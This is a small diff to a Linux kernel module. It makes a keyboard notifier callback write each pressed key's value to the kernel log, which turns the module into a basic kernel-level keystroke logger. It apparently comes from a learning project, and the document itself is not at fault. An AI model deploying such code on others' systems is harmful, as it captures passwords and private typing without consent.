@@ -13,9 +13,12 @@ MODULE_VERSION("1.0");
 static int func(struct notifier_block* s, unsigned long action, void* pointer)
 {
 	struct keyboard_notifier_param* param = (struct keyboard_notifier_param*) pointer;
-	printk(KERN_INFO "Called by keyboard interaction\n");
 
 	/* TODO PRINT */
+	if( (action == KBD_KEYSYM) && (param->down))
+	{
+		printk(KERN_INFO "KBD_UNICODE : %c\n", param->value);
+	}
 
 	return NOTIFY_OK;
 }
